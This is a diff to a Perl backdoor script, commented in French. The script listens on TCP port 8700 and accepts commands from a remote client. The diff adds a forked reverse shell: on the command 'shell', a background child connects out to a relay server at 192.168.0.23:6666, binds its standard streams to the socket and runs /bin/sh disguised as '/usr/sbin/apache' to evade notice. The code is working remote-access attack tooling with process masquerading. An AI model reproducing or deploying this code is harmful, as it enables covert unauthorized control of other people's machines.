@@ -1,10 +1,15 @@
 #!/usr/bin/perl -w
 
 use strict;
+use Socket;
 use IO::Socket;
+use FileHandle;
 
 #notre adresse ip publique qui sera en fait l'adresse d'un serveur rebond
 my $publicip = "192.168.0.23";
+my $shellsock;
+my $fakeprocess        = "/usr/sbin/apache";
+my $reverse_shell_port = 6666;
 
 ############### FUNCTIONS ###############
 
@@ -25,15 +30,31 @@ BAN
 }
 
 sub reverse_shell {
-    my ( $shellsock, $shellip, $shellport ) = ( "", "$publicip", 6666 );
-    $shellsock = new IO::Socket::INET(
-        PeerHost => $shellip,
-        PeerPort => $shellport,
-        Proto    => 'tcp'
-    ) or die;
 
-    #print $shellsock "Connexion etablie sur le serveur\n";
+    socket( SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp') ) or die "$@\n";
+    connect( SOCK, sockaddr_in( $reverse_shell_port, inet_aton($publicip) ) )
+        or die "$@\n";
+}
 
+sub subprocess_reverse_shell {
+
+    my $ppid = fork();
+
+    #on place le processus en arrière-plan (processus enfant)
+    if ( $ppid == 0 ) {
+
+		#on appelle la connexion via le selecteur SOCK, qui sera utilisé pour la connexion (pipe)
+        reverse_shell();
+
+        open( STDIN,  ">&SOCK" ) or die;
+        open( STDOUT, ">&SOCK" ) or die;
+        open( STDERR, ">&SOCK" ) or die;
+        exec( {"/bin/sh"} ( $fakeprocess, "-i" ) );
+
+        #system("/bin/sh -i");
+    }
+
+    #print "Execution du shell passe en arriere-plan avec succes.";
 }
 
 ############### MAIN ###############
@@ -43,9 +64,7 @@ $port = 8700;
 
 #mise en place du serveur
 $sock = new IO::Socket::INET(
-    Proto => 'tcp',
-
-    # LocalHost => '127.0.0.1',
+    Proto     => 'tcp',
     LocalPort => $port,
     Listen    => SOMAXCONN,
     Reuse     => 1
@@ -58,21 +77,15 @@ while ( $client = $sock->accept() ) {
     $client->send( print_banner() );
     $client->send(">");
 
-    if ( defined($client) ) {
-
-    }
-
     #reception des directives
     while (<$client>) {
         chomp;
 
         $client->send(">");
 
-        if (/quit/) {
-            close($client) or die;
-        }
+        last if (/quit/);
 
-        reverse_shell() if (/shell/);
+        subprocess_reverse_shell() if (/shell/);
 
     }
     continue {
@@ -80,3 +93,4 @@ while ( $client = $sock->accept() ) {
     }
     close($client);
 }
+close($sock);
